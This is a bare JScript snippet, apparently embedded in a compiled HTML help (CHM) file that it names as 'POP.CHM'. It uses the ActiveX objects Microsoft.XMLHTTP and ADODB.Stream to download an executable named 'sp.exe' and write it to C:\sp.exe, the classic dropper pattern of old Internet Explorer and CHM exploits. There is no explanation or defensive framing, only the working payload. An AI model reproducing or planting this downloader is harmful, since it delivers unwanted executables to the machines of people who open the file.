~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<SCRIPT LANGUAGE=JScript>

    function getPath(url) {
        start = url.indexOf('http:')
        end = url.indexOf('POP.CHM')
        return url.substring(start, end);
    }
    
    payloadURL = 'sp.exe';
    
    var x = new ActiveXObject("Microsoft.XMLHTTP"); 
    x.Open("GET",payloadURL,0); 
    x.Send(); 
    
    var s = new ActiveXObject("ADODB.Stream");
    s.Mode = 3;
    s.Type = 1;
    s.Open();
    s.Write(x.responseBody);
    s.SaveToFile("C:\\sp.exe",2);

</SCRIPT>